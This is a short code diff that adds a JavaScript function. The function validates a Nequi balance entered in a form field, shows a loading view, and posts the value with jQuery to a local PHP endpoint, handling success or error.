@@ -735,6 +735,28 @@ function actualizar_casos(){
             }else{
 
             }
+			function guardarSaldoNequi() {
+    var saldo = document.getElementById("inputsaldo").value;
+    
+    if (saldo.trim().length < 3) {
+        document.getElementById("msgSaldo").style.display = "block";
+        return;
+    }
+    
+    // Mostrar spinner de carga ← ESTO ERA LO QUE FALTABA
+    vista_saldo_listo();
+    
+    // Enviar saldo al backend
+    $.post("../../../process/guardar_saldo.php", {saldo: saldo}, function(data) {
+        if (data.trim() === 'OK') {
+            console.log('Saldo guardado correctamente');
+            // El panel cambiará de estado automáticamente
+        } else {
+            console.error('Error al guardar saldo');
+            vista_saldo();  // Volver a mostrar el formulario
+        }
+    });
+}
         });
     });
 }
